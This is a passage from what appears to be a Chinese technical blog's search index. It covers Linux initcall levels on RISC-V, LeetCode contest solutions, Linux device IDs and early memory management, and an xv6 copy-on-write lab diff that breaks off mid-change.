a/arch/riscv/kernel/Makefile+++ b/arch/riscv/kernel/Makefile@@ -29,6 +29,7 @@ obj-y += riscv_ksyms.o obj-y  += stacktrace.o obj-y  += cacheinfo.o obj-y  += patch.o+obj-y  += initcall_test.o obj-$(CONFIG_MMU) += vdso.o vdso/\n修改完成后编译内核，并使用 QEMU 模拟器进行启动，内核启动的打印信息如下：\n...[    0.001681] [⭐RISC-V Initcall] console_initcall executed[    0.003134] Console: colour dummy device 80x25[    0.010536] printk: console [tty0] enabled[    0.013249] Calibrating delay loop (skipped), value calculated using timer frequency.. 20.00 BogoMIPS (lpj=40000)[    0.013440] pid_max: default: 32768 minimum: 301[    0.014683] Mount-cache hash table entries: 16384 (order: 5, 131072 bytes, linear)[    0.014842] Mountpoint-cache hash table entries: 16384 (order: 5, 131072 bytes, linear)[    0.037256] [⭐RISC-V Initcall] early_initcall executed[    0.037908] rcu: Hierarchical SRCU implementation.[    0.039356] EFI services will not be available.[    0.041471] smp: Bringing up secondary CPUs ...[    0.049906] smp: Brought up 1 node, 4 CPUs[    0.061418] devtmpfs: initialized[    0.066783] [⭐RISC-V Initcall] pure_initcall executed[    0.068512] [⭐RISC-V Initcall] core_initcall executed[    0.070325] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns[    0.070544] futex hash table entries: 1024 (order: 4, 65536 bytes, linear)[    0.074988] NET: Registered protocol family 16[    0.076708] [⭐RISC-V Initcall] postcore_initcall executed[    0.079466] [⭐RISC-V Initcall] arch_initcall executed[    0.088406] [⭐RISC-V Initcall] subsys_initcall executed[    0.128276] vgaarb: loaded[    0.129447] SCSI subsystem initialized[    0.131491] usbcore: registered new interface driver usbfs[    0.132061] usbcore: registered new interface driver hub[    0.132356] usbcore: registered new device driver usb[    0.139530] [⭐RISC-V Initcall] fs_initcall executed[    0.140768] clocksource: Switched to clocksource riscv_clocksource[    0.171715] NET: Registered protocol family 2...[    0.190188] PCI: CLS 0 bytes, default 64[    0.194343] [⭐RISC-V Initcall] rootfs_initcall executed[    0.194487] [⭐RISC-V Initcall] device_initcall executed[    0.196698] workingset: timestamp_bits=62 max_order=21 bucket_order=0[    0.208411] NFS: Registering the id_resolver key type...[    0.561583] 9pnet: Installing 9P2000 support[    0.562203] Key type dns_resolver registered[    0.562514] [⭐RISC-V Initcall] late_initcall executed[    0.563478] debug_vm_pgtable: [debug_vm_pgtable         ]: Validating architecture page table helpers...\n有关 Linux 内核如何实现这样的初始化机制，可以参考这篇文章：Linux 各种 initcall 的调用原理-CSDN博客。\n初始化级别的选择选择 initcall 级别的核心原则是：你的初始化函数所依赖的子系统必须已经初始化完成。\n对于个人当前可能涉及到的内核开发工作来说，device_initcall 最常用，适用于大多数设备驱动程序的初始化，此时核心子系统、总线都已准备就绪。其次是 arch_initcall，进行处理器架构相关的初始化。如果初始化时机并不那么重要，又为了保险起见，可以选择 late_initcall，此时模块所依赖的子系统已经完全初始化完成。至于其他的一些初始化接口，可能一般不太会用到，等需要的时候再来研究吧。\n","categories":["操作系统"],"tags":["操作系统","Linux"]},{"title":"LeetCode周赛总结 第334场","url":"/2023/02/26/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC334%E5%9C%BA/","content":"左右元素和的差值题目链接左右元素和的差值\n解题思路直接按照题目要求模拟即可，两次遍历求出 leftSum 和 rightSum，再计算得出 answer.\n解题代码class Solution &#123;public:    vector&lt;int&gt; leftRigthDifference(vector&lt;int&gt;&amp; nums) &#123;        int n = nums.size();        vector&lt;int&gt; leftSum(n, 0);        for (int i = 0; i &lt; n - 1; ++i) &#123;            leftSum[i + 1] = leftSum[i] + nums[i];        &#125;        vector&lt;int&gt; rightSum(n, 0);        for (int i = n - 1; i &gt; 0; --i) &#123;            rightSum[i - 1] = rightSum[i] + nums[i];        &#125;        vector&lt;int&gt; res;        for (int i = 0; i &lt; n; ++i) &#123;            res.emplace_back(abs(leftSum[i] - rightSum[i]));        &#125;        return res;    &#125;&#125;;\n找出字符串的可整除数组题目链接找出字符串的可整除数组\n解题思路n 的取值范围为 1 &lt;= n &lt;= 1e5，因此直接暴力求解显然是行不通的。\n对于处理大整数除以某个数的余数的问题，有一些常见的公式可以用于简化运算：\n\n(a+b) mod n = ((a mod n)+ (b mod n)) mod n\n(a-b) mod n = ((a mod n) - (b mod n)+n) mod n\nab mod n = (a mod n) (b mod n) mod n\n\n具体到本题而言，由于 word[0,…,i] 表示的数等于 word[0,…,i - 1] * 10 + word[i]，因此可以上述公式，将 (a * b + c) mod n 转换为 ((a mod n)  b + c) mod n，即 `word[0,…,i] mod n = ((word[0,…,i - 1] mod n)  10 + word[i]) mod n，而word[0,…,i - 1] mod n` 正好就是上一个大整数作模运算的余数。\n因此可以维护一个余数 rem，初始值为 0，每次遍历将 rem 的值根据上述递推公式更新：rem = (rem * 10 + word[i] - &#39;0&#39;) % m ，再判断该余数 rem 是否为 0，加入结果数组中。\n解题代码class Solution &#123;public:    vector&lt;int&gt; divisibilityArray(string word, int m) &#123;        vector&lt;int&gt; res;        long long rem = 0;        for (int i = 0; i &lt; word.size(); ++i) &#123;            rem = (rem * 10 + word[i] - &#x27;0&#x27;) % m;            if (rem == 0) res.emplace_back(1);            else res.emplace_back(0);        &#125;        return res;    &#125;&#125;;\n求出最多标记下标题目链接求出最多标记下标\n解题思路对于本题这种选择满足条件的最大值的问题，可以考虑使用二分答案法。即确定可能答案的最小和最大值，然后进行二分查找，利用 check 函数进行判断，直到找到满足条件的最大值。\n显然，可能的最大答案为 n / 2 对（n 个下标），最小答案为 0. 而要判断 k 对下标是否可能，则可以利用贪心的思想，让第 i 个最小的数和第 k - i + 1 个最大的数进行配对，且 i 从 0 到 k（共有 k 组配对），只要该最优匹配下有一组不满足条件（即 2 * nums[i] &gt; nums[j]），则一定无法形成 k 组配对，即最大答案必定小于 k；若这 k 组配对都满足条件，则最大答案必定大于等于 k.\n解题代码class Solution &#123;public:    int maxNumOfMarkedIndices(vector&lt;int&gt;&amp; nums) &#123;        int n = nums.size();        sort(nums.begin(), nums.end());        auto check = [&amp;](int k) -&gt; bool &#123;            int p1 = 0, p2 = n - k + p1;            while (p2 &lt; n) &#123;                if (nums[p1] * 2 &gt; nums[p2]) &#123;                    return false;                &#125;                ++p1;                ++p2;            &#125;            return true;        &#125;;        int res = -1;        int left = 0, right = n / 2;        while (left &lt;= right) &#123;            int mid = (left + right) / 2;            if (check(mid)) &#123;                res = mid;                left = mid + 1;            &#125;            else &#123;                right = mid - 1;            &#125;        &#125;        return 2 * res;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"Linux文件系统的设备ID","url":"/2026/01/17/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E5%A4%87ID/","content":"本文将介绍 Linux 文件系统中的文件的设备 ID 相关内容，基于的内核版本为 6.18。\n\n为了介绍设备 ID 的概念，我们借助 stat 工具来对打印几个不同类型文件的元数据信息。\n首先是一个位于磁盘文件系统下的普通文件 file.txt：\n$ stat file.txt  File: file.txt  Size: 392             Blocks: 8          IO Block: 4096   regular fileDevice: 8,80    Inode: 16473       Links: 1...\n可以看到，其 Device 编号为 8,80，具体含义我们后面再解释。\n接下来要查看的是伪文件系统（如 ramfs、procfs 等没有直接关联的磁盘设备的文件系统）下的文件元数据信息，由于我的本地 Linux 环境是 WSL2，因此这里我选取了挂载在 Linux 下的 Windows 磁盘：/mnt/d，顾名思义，它就是我 Windows 系统下的 D 盘。WSL2 通过 9p 协议将 Windows 磁盘挂载到 Linux 下，其并不属于磁盘文件系统，打印的元数据信息如下：\n\n由于 9p 走的网络协议栈，因此 WSL2 下读写 Windows 磁盘文件的性能很差。\n\n$ stat /mnt/d/  File: /mnt/d/  Size: 4096            Blocks: 0          IO Block: 4096   directoryDevice: 0,116   Inode: 1407374883553287  Links: 1...\n可以看到，其 Device 编号为 0,116。\n接下来是一个实际的物理磁盘文件（块设备文件），即我的 WSL2 下的根目录的设备文件：\n$ stat /dev/sdf  File: /dev/sdf  Size: 0               Blocks: 0          IO Block: 4096   block special fileDevice: 0,5     Inode: 169         Links: 1     Device type: 8,80\n对于设备文件，其既包含 Device 编号（0,5），还包括 Device Type（8,80，注意刚好与前面的第一个实例相匹配），同时明确表明了这是一个块设备文件（block special file）。\n最后一个实例也是设备文件，只不过是一个字符设备文件，这里我选取了 KVM 文件，其打印如下：\n$ stat /dev/kvm  File: /dev/kvm  Size: 0               Blocks: 0          IO Block: 4096   character special fileDevice: 0,5     Inode: 401         Links: 1     Device type: 10,232\n可以看到，其 Device 编号与 /dev/sdf 一样。\n设备 ID 构成上面提到了两个设备 ID 信息——Device Type 和 Device，它们分别对应 fstat 系统调用返回的 struct stat 结构中的 st_rdev 字段和 st_dev 字段。它们的值都满足 Linux 设备 ID 的规范：编号用一个 32 位无符号整型表示，低 20 位表示次设备号（minor），剩余的高位表示主设备号（major）。相关代码如下所示：\n/* include/linux/types.h:18,21 */typedef u32 __kernel_dev_t;typedef __kernel_dev_t dev_t;/* include/linux/kdev_t.h:7-12 */#define MINORBITS   20#define MINORMASK   ((1U &lt;&lt; MINORBITS) - 1)#define MAJOR(dev)  ((unsigned int) ((dev) &gt;&gt; MINORBITS))#define MINOR(dev)  ((unsigned int) ((dev) &amp; MINORMASK))#define MKDEV(ma,mi) (((ma) &lt;&lt; MINORBITS) | (mi))\n设备 ID 获取Device Type (st_rdev) 表示一个设备文件（块设备或字符设备）的设备 ID，对于普通文件、目录等其他文件类型来说，该字段是不存在（没有意义）的。Device Type 存储在文件的内存 inode 结构中的 i_rdev 字段，因此 Device Type 是文件粒度的，其在块设备驱动初始化的时候进行设置（具体设置的流程不在本文讨论的范围之内）。\n设备 ID 的主设备号表示设备的类型（如磁盘设备、内存设备、串口设备等），次设备号表示本设备在主设备类型中的编号。以下是一些设备号分配的示例：\n\n\n\n\n设备\n主设备号\n次设备号\n说明\n\n\n\n\n/dev/sda\n8\n0\n第一个 SCSI 磁盘\n\n\n/dev/sdb\n8\n16\n第二个 SCSI 磁盘（16 的倍数）\n\n\n/dev/ram0\n1\n0\n第一个 RAM 设备\n\n\n/dev/loop0\n7\n0\n第一个回环设备\n\n\n\n\nDevice（st_dev） 表示 一个文件（包括设备文件和非设备文件）所位于的文件系统的设备 ID 。可以分为两种情况来考虑，即：\n\n文件位于磁盘文件系统下，那么 st_dev 即该磁盘对应的设备 ID（即上述提到的 st_rdev）。\n文件位于伪文件系统下，那么 st_dev 为该伪文件系统对应的设备 ID。\n\n前面在介绍设备 ID 构成时有一个没有提到的约定是： 对于主设备号来说，0 值表示该设备是一个伪文件系统。\nDevice 值存储在 super_block 结构的 st_dev 字段中，由于存储在超级块中，因此 Device 是文件系统粒度的。对于伪文件系统而言，它在文件系统的挂载阶段使用 Linux 内核中的 IDA（ID Allocator）进行动态分配；对于磁盘文件系统而言，其从块设备中获取，具体来说，根据挂载参数解析出对应磁盘文件，然后获取该磁盘文件的 Device Type，即为整个磁盘文件系统的 Device 值。\n\n有一个细节需要注意，IDA 在进行次设备 ID 分配时，最小是从 1 开始的，因为许多的用户态程序通常认为设备 ID 为 0（主、次设备 ID 都为 0）的设备是无效的，对此内核代码中有明确的说明：\n/* fs/super.c:1253 */int get_anon_bdev(dev_t *p)&#123;    int dev;    /*     * Many userspace utilities consider an FSID of 0 invalid.     * Always return at least 1 from get_anon_bdev.     */    dev = ida_alloc_range(&amp;unnamed_dev_ida, 1, (1 &lt;&lt; MINORBITS) - 1,            GFP_ATOMIC);    if (dev == -ENOSPC)        dev = -EMFILE;    if (dev &lt; 0)        return dev;    *p = MKDEV(0, dev);    return 0;&#125;\n\n最后，在理解了上述内容后，回看文章开头的四个例子。\n第一个 file.txt 文件的 Device 为 8,80，实际上表示的是磁盘 /dev/sdf，即我的根目录挂载点的磁盘设备。\n第二个 /mnt/d/ 文件的 Device 为 0,116，主设备 ID 为 0，满足伪文件系统的定义。\n第三个 /dev/sdf 文件的 Device 为 0,5，可能初看会有些令人困惑，但仔细想想，设备文件 /dev/sdf 是挂载在 /dev 目录下的一个文件，其属于伪文件系统 devtmpfs 的范畴，那么主设备号为 0 也就不奇怪了，实际上 /dev 目录下的所有文件的 Device 值都为 0,5。而 Device Type 就比较明确了，正好和前面的 file.txt 相对应。 \n第四个 /dev/kvm 文件的 Device 也为 0,5，和刚刚所说的一致。而 Device Type 值为 10,232（10 通常表示一个杂项的字符设备），也符合预期。\n","categories":["操作系统"],"tags":["操作系统","Linux","文件系统"]},{"title":"Linux内核物理内存管理器的建立过程","url":"/2025/10/12/Linux%E5%86%85%E6%A0%B8%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B/","content":"本文将介绍 Linux 内核中物理内存管理结构的建立过程，主要分为获取物理内存布局、早期内存管理器和最终内存管理器三个阶段，本文将以 x86_64 架构为例，内核代码基于 Linux 5.10 版本来介绍。\n\n获取物理内存布局当 x86_64 系统启动，BIOS 将控制权交给 Bootloader（如 GRUB） 之后，此时 CPU 模式还处于 实模式 下，可以进行 BIOS 中断调用，Bootloader 将会通过反复调用（每次只能获取一段内存区域的信息） int 0x15 eax=0xE820 这个中断来获取计算机的物理内存布局。\n\n0x15 号中断还有 0xE801, 0x88 的功能号，都用于获取物理内存布局，只不过功能更简单。\n\n存储获取到的每段内存区域信息的数据结构如下，包括起始地址、大小、类型。\n/* arch/x86/include/uapi/asm/bootparam.h */struct boot_e820_entry &#123;\t__u64 addr;\t__u64 size;\t__u32 type;&#125; __attribute__((packed));\nBootloader 会在将控制权交给内核前，将获取到的 e820 条目传给内核，存储在内核的 boot_params.e820_table 数据结构中。\n/* arch/x86/include/uapi/asm/bootparam.h */struct boot_params &#123;\t...\t__u8  e820_entries;  // 条目数量\t...\tstruct boot_e820_entry e820_table[E820_MAX_ENTRIES_ZEROPAGE];\t...&#125; __attribute__((packed));\n内核早期函数 e820__memory_setup() 会复制并整理这张表，生成三份：\n\ne820_table：主表，供内核使用。\ne820_table_firmware：原始 BIOS 数据备份。\ne820_table_kexec：供 kexec 热重启使用。\n\n/* arch/x86/kernel/e820.c */void __init e820__memory_setup(void)&#123;\tchar *who;\t/* This is a firmware interface ABI - make sure we don&#x27;t break it: */\tBUILD_BUG_ON(sizeof(struct boot_e820_entry) != 20);\twho = x86_init.resources.memory_setup();\tmemcpy(e820_table_kexec, e820_table, sizeof(*e820_table_kexec));\tmemcpy(e820_table_firmware, e820_table, sizeof(*e820_table_firmware));\tpr_info(&quot;BIOS-provided physical RAM map:\\n&quot;);\te820__print_table(who);&#125;\n至此，内核中已经保存有关于机器各物理内存区域的布局信息。最后，调用 e820__print_table 将其打印出来。\n[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000001ffdbfff] usable[    0.000000] BIOS-e820: [mem 0x000000001ffdc000-0x000000001fffffff] reserved[    0.000000] BIOS-e820: [mem 0x00000000b0000000-0x00000000bfffffff] reserved[    0.000000] BIOS-e820: [mem 0x00000000fed1c000-0x00000000fed1ffff] reserved[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved...\n早期内存管理器内核中有了物理内存的布局信息，便可以开始建立和初始化物理内存管理的数据结构了。但是事实上，这个内存管理器的建立其实也要分两个阶段来进行——从早期内存管理器过渡到最终内存管理器。之所以要经历这样貌似“多余”的步骤，原因其实很简单，Linux 的最终物理内存管理器的数据结构 足够复杂 ，需要用到动态内存分配机制，但是本身动态内存分配机制就要有内存管理器的支持，因此引入一个临时的、简单的、仅依赖静态内存分配的内存管理器就很顺理成章了。\n有关 Linux 内核中早期内存管理器的发展历史，可以参考这篇文章：A quick history of early-boot memory allocators。\n现在 Linux 所采用的早期内存管理器为 memblock，其数据结构定义如下所示：\n/* include/linux/memblock.h */struct memblock_region &#123;\tphys_addr_t base;           // 内存区域基址\tphys_addr_t size;           // 内存区域大小\tenum memblock_flags flags;  // 内存区域特性#ifdef CONFIG_NEED_MULTIPLE_NODES\tint nid;                    // NUMA结点号#endif&#125;;struct memblock_type &#123;\tunsigned long cnt;                // 内存区域数量\tunsigned long max;                // 内存区域数组的大小\tphys_addr_t total_size;           // 内存区域的总大小\tstruct memblock_region *regions;  // 内存区域数组\tchar *name;                       // 内存区域名&#125;;struct memblock &#123;\tbool bottom_up;                 // 是否是自底向上的方向?\tphys_addr_t current_limit;      // 地址分配的界限\tstruct memblock_type memory;    // 可用的内存区域\tstruct memblock_type reserved;  // 保留的内存区域&#125;;\n值得一提的一个细节是，memblock_type 的内存区域数组字段 regions 为指针类型，可能会下意识地认为这是一个需要用到动态内存分配的动态数组，与前面提到的”仅依赖静态内存分配“的要求相悖，但事实并非如此。\n下面是内核中 memblock 全局变量的初始化，可以看到，memory 和 reserved 的 regions 字段其实都指向的分别为一个长度为 INIT_MEMBLOCK_REGIONS 和 INIT_MEMBLOCK_RESERVED_REGIONS 的定长数组。\n/* mm/memblock.c */static struct memblock_region memblock_memory_init_regions[INIT_MEMBLOCK_REGIONS] __initdata_memblock;static struct memblock_region memblock_reserved_init_regions[INIT_MEMBLOCK_RESERVED_REGIONS] __initdata_memblock;struct memblock memblock __initdata_memblock = &#123;\t.memory.regions\t\t= memblock_memory_init_regions,\t.memory.cnt\t\t= 1,\t/* empty dummy entry */\t.memory.max\t\t= INIT_MEMBLOCK_REGIONS,\t.memory.name\t\t= &quot;memory&quot;,\t.reserved.regions\t= memblock_reserved_init_regions,\t.reserved.cnt\t\t= 1,\t/* empty dummy entry */\t.reserved.max\t\t= INIT_MEMBLOCK_RESERVED_REGIONS,\t.reserved.name\t\t= &quot;reserved&quot;,\t.bottom_up\t\t= false,\t.current_limit\t\t= MEMBLOCK_ALLOC_ANYWHERE,&#125;;\n之所以要用指针类型而不是直接在 memblock_type 中内嵌数组，个人认为可能是为了后续可能的动态扩展的需求。当然这样的动态扩展也是要基于内存管理器来完成的，这部分内容不在本文的讨论范围内。\n下列代码就是根据 E820 表对 memblock 数据结构进行填充的过程：\n/* arch/x86/kernel/e820.c */void __init e820__memblock_setup(void)&#123;\t...\tfor (i = 0; i &lt; e820_table-&gt;nr_entries; i++) &#123;\t\tstruct e820_entry *entry = &amp;e820_table-&gt;entries[i];\t\tend = entry-&gt;addr + entry-&gt;size;\t\tif (end != (resource_size_t)end)\t\t\tcontinue;\t\tif (entry-&gt;type == E820_TYPE_SOFT_RESERVED)\t\t\tmemblock_reserve(entry-&gt;addr, entry-&gt;size);\t\tif (entry-&gt;type != E820_TYPE_RAM &amp;&amp; entry-&gt;type != E820_TYPE_RESERVED_KERN)\t\t\tcontinue;\t\tmemblock_add(entry-&gt;addr, entry-&gt;size);\t&#125;\t...&#125;\n最终内存管理器最终，在有了完整的 memblock 结构之后，将开始向最终内存管理器的过渡过程。这部分的内容比较复杂，我也没有仔细研究，等有需要可以考虑单开一篇文章来介绍，下面只是简单的总结。\n\n初始化页表与内核直接映射：init_mem_mapping 会建立完整的内核页表，最关键的是建立对全部物理内存的直接映射（Direct Map）。这意味着所有的物理内存都被线性地映射到一个固定的内核虚拟地址空间（例如，从 0xffff800000000000 开始），使得内核可以方便地访问任何物理地址。\n伙伴系统：mem_init 函数中会释放所有由 memblock 管理的可用内存给伙伴系统（Buddy System）。伙伴系统是内核管理物理页帧（通常为 4KB）的核心分配器，负责处理 高阶连续物理内存的分配和释放 。此时，memblock 分配器的任务基本完成，内核后续的物理内存分配将由伙伴系统接管。\n精细化管理：在伙伴系统之上，内核还会初始化 kmem_cache 等机制，用于高效分配内核中常用的小对象（如 task_struct），以减轻伙伴系统的负担并减少内存碎片。\n\n","categories":["操作系统"],"tags":["操作系统","Linux"]},{"title":"MIT6.s081 2021 Lab Copy on-write","url":"/2024/08/13/MIT6.s081-2021-Lab%20Copy%20on-write/","content":"Implement copy-on write背景xv6 使用 fork() 系统调用创建子进程时，需要将父进程的地址空间进行 深拷贝 ，即将页表和实际物理空间同时进行拷贝，以实现父进程和子进程地址空间的独立性。但很多时候，如 shell 程序，fork() 通常与 exec() 搭配使用，首先使用 fork() 创建子进程，随后在子进程中使用 exec() 将指定的程序加载到当前地址空间，这样在 fork() 中进行的地址空间拷贝就白白浪费了。\n本实现要求实现一个写时复制（copy-on write）的 fork() 系统调用。具体来说，在进行虚拟内存拷贝时，不直接进行物理内存的拷贝，只是将父进程的页表复制给子进程，这样子进程和父进程的每个虚拟页面都指向了同一个物理页面，当子进程需要对某个虚拟页面进行写入时，为了保证父进程和子进程之间的独立性，子进程此时将进行物理内存的分配和拷贝，再进行写入。\n实现方案根据提示，可以将上述的写时复制的思路用 异常 的方式来实现。\n首先可以利用页表项的 flags 中的 RSW 位来表示页表项是否为 COW 页，以便后续的异常处理。\n修改 uvmcopy() ，将物理页面的分配操作去除，只是进行页表的拷贝，并将父进程和子进程的对应页表项的 PTE_W 置 0（以便在对 COW 页进行写入时陷入内核）、PTE_COW 置 1。\n修改 usertrap()，当陷入内核时，内核通过查看 scause 寄存器（见下图）以及页表项的 PTE_W 和 PTE_COW 位，识别到陷入原因是发生在 COW 页上的 store page fault（寄存器值为 15）时，进行对应的异常处理：使用 kalloc() 为其分配物理页面，并将其页表项指向的物理地址数据拷贝到新分配的物理地址下，实现物理内存的拷贝。此时由于页表映射发生了改变，需要插入新的页表项，并删除旧的页表项。在处理了 COW 异常之后，该页面将不再是一个 COW 页，因此需要将 PTE_W 置 1、PTE_COW 置 0。\n\n为了后续实现的方便，可以将 COW 页的判断和 COW 页的异常处理分别封装为两个函数：\nint iscowpage(pagetable_t pgtbl, uint64 va) &#123;    if (va &gt;= MAXVA) return 0;    pte_t *pte = walk(pgtbl, va, 0);    if (pte == 0) return 0;    if ((*pte &amp; PTE_V) == 0) return 0;    if ((*pte &amp; PTE_U) == 0) return 0;    return *pte &amp; PTE_COW;&#125;int cowfault(pagetable_t pagetable, uint64 va) &#123;    uint64 va0 = PGROUNDDOWN(va);    pte_t* pte;    if((pte = walk(pagetable, va0, 0)) == 0) return -1;    uint64 flags = PTE_FLAGS(*pte);    uint64 pa0 = PTE2PA(*pte);    flags &amp;= (~PTE_COW); // clear COW bit    flags |= PTE_W;      // set write bit    uint64 mem;    if ((mem = (uint64)kalloc()) == 0) return -1;    memmove((void *)mem, (void *)pa0, PGSIZE);    // remove old PTE    uvmunmap(pagetable, va0, 1, 1);    // install new PTE    if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;        kfree((void *)mem);        return -1;    &#125;    return 0;&#125;\n此外，还需要为每个物理页面引入 引用计数（reference count） ，页面创建时计数为 1，每次添加或移除指向该物理地址的页表项都增加或减少引用计数，当引用计数为 0 时释放该物理页面。这里有一个实现的技巧：将引用计数的减少放到 kfree() 中，在 kfree() 中根据引用计数的大小决定是否释放物理页面。\n最后，也是很容易忽视的一点，修改 copyout() 以实现对 COW 页的支持。刚开始看到这个提示的时候我很疑惑，前面的工作貌似已经足够实现 COW 了，为什么还要修改 copyout？原来 xv6 对 COW 页进行写时复制都是基于 store page fault，即当尝试写入一个 PTE_W 为 0 的页面时触发异常，导致陷入内核，再由内核进行 COW 页面的异常处理，其中陷入内核的操作是由硬件自动来完成的，具体来说，是在虚实地址转换阶段由 MMU 来完成的。而 copyout() 是运行在内核态下的函数，其地址转换是由内核中的函数 walk() 来实现的，因而不会自动触发异常并交由异常处理程序来处理，而需要手动来完成。由于前面已经将 COW 页的判断和处理封装成了函数，因此对 copyout() 的修改很简单：\nif (iscowpage(pagetable, va0)) &#123;    cowfault(pagetable, va0);&#125;\n代码diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..f5a9d8d 100644--- a/kernel/defs.h+++ b/kernel/defs.h@@ -63,6 +63,7 @@ void            ramdiskrw(struct buf*); void*           kalloc(void); void            kfree(void *); void            kinit(void);+void            incrfcount(void*);  // log.c void            initlog(int, struct superblock*);@@ -145,6 +146,8 @@ void            trapinit(void); void            trapinithart(void); extern struct spinlock tickslock; void            usertrapret(void);+int             iscowpage(pagetable_t, uint64);+int             cowfault(pagetable_t, uint64);  // uart.c void            uartinit(void);@@ -170,6 +173,7 @@ uint64          walkaddr(pagetable_t, uint64); int             copyout(pagetable_t, uint64, char *, uint64); int             copyin(pagetable_t, char *, uint64, uint64); int             copyinstr(pagetable_t, char *, uint64, uint64);+pte_t*          walk(pagetable_t, uint64, int);  // plic.c void            plicinit(void);diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..5872b85 100644--- a/kernel/kalloc.c+++ b/kernel/kalloc.c@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end); extern char end[]; // first address after kernel.                    // defined by kernel.ld. +#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)++int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];+struct spinlock rflock;+ struct run &#123;   struct run *next; &#125;;@@ -27,6 +32,7 @@ void kinit() &#123;   initlock(&amp;kmem.lock, &quot;kmem&quot;);+  initlock(&amp;rflock, &quot;rflock&quot;);   freerange(end, (void*)PHYSTOP); &#125; @@ -51,15 +57,17 @@ kfree(void *pa)   if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)     panic(&quot;kfree&quot;); -  // Fill with junk to catch dangling refs.-  memset(pa, 1, PGSIZE);--  r = (struct run*)pa;--  acquire(&amp;kmem.lock);-  r-&gt;next = kmem.freelist;-  kmem.freelist = r;-  release(&amp;kmem.lock);+  acquire(&amp;rflock);+  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;+    memset(pa, 1, PGSIZE);+    // Fill with junk to catch dangling refs.+    r = (struct run*)pa;+    acquire(&amp;kmem.lock);+    r-&gt;next = kmem.freelist;+    kmem.freelist = r;+    release(&amp;kmem.lock);+  &#125;+  release(&amp;rflock); &#125;  // Allocate one 4096-byte page of physical memory.@@ -76,7 +84,15 @@ kalloc(void)     kmem.freelist = r-&gt;next;   release(&amp;kmem.lock); -  if(r)+  if(r) &#123;     memset((char*)r, 5, PGSIZE); // fill with junk+    rfcount[PA2RFIDX(r)] = 1;+  &#125;   return (void*)r; &#125;++void incrfcount(void* pa)&#123;+  acquire(&amp;rflock);+  ++rfcount[PA2RFIDX(pa)];+  release(&amp;rflock);+&#125;\\ No newline at end of filediff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..a6ba9e7 100644--- a/kernel/riscv.h+++ b/kernel/riscv.h@@ -343,6 +343,8 @@ sfence_vma() #define PTE_W (1L &lt;&lt; 2) #define PTE_X (1L &lt;&lt; 3) #define PTE_U (1L &lt;&lt; 4) // 1 -&gt; user can access+#define PTE_COW (1L &lt;&lt; 8) // 1 -&gt; is a COW page+  // shift a physical address to the right place for a PTE. #define PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..0fb7687 100644--- a/kernel/trap.c+++ b/kernel/trap.c@@ -29,6 +29,42 @@ trapinithart(void)   w_stvec((uint64)kernelvec); &#125; ++int iscowpage(pagetable_t pgtbl, uint64 va) &#123;+  if (va &gt;= MAXVA) return 0;+  pte_t *pte = walk(pgtbl, va, 0);+  if (pte == 0) return 0;+  if ((*pte &amp; PTE_V) == 0) return 0;+  if ((*pte &amp; PTE_U) == 0) return 0;+  return *pte &amp; PTE_COW;+&#125;++int cowfault(pagetable_t pagetable, uint64 va) &#123;+  uint64 va0 = PGROUNDDOWN(va);+  pte_t* pte;+  if((pte = walk(pagetable, va0, 0)) == 0) return -1;+  +  uint64 flags = PTE_FLAGS(*pte);+  uint64 pa0 = PTE2PA(*pte);++  flags &amp;= (~PTE_COW); // clear COW bit+  flags |= PTE_W;      // set write bit++  uint64 mem;+  if ((mem = (uint64)kalloc()) == 0) return -1;+  memmove((void *)mem, (void *)pa0, PGSIZE);++  // remove old PTE+  uvmunmap(pagetable, va0, 1, 1);+  +  // install new PTE+  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;+    kfree((void *)mem);+    return -1;+  &#125;+  return 0;+&#125;+ // // handle an interrupt, exception, or system call from user space. // called from trampoline.S@@ -67,7 +103,12 @@ usertrap(void)     syscall();   &#125; else if((which_dev = devintr()) != 0)&#123;     // ok-  &#125; else &#123;+  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p-&gt;pagetable, r_stval())) &#123;+    if (cowfault(p-&gt;pagetable, r_stval()) &lt; 0) &#123;+      p-&gt;killed = 1;+    &#125;+  &#125;+  else &#123;     printf(&quot;usertrap(): unexpected scause %p pid=%d\\n&quot;, r_scause(), p-&gt;pid);     printf(&quot;            sepc=%p stval=%p\\n&quot;, r_sepc(), r_stval());     p-&gt;killed = 1;diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..df0ddde 100644--- a/kernel/vm.c+++ b/kernel/vm.c@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)   pte_t *pte;   uint64 pa, i;   uint flags;-  char *mem;    for(i = 0; i &lt; sz; i += PGSIZE)&#123;     if((pte = walk(old, i, 0)) == 0)       panic(&quot;uvmcopy: pte should exist&quot;);     if((*pte &amp; PTE_V) == 0)       panic(&quot;uvmcopy: page not present&quot;);+    *pte &amp;= ~PTE_W;   // set write bit+    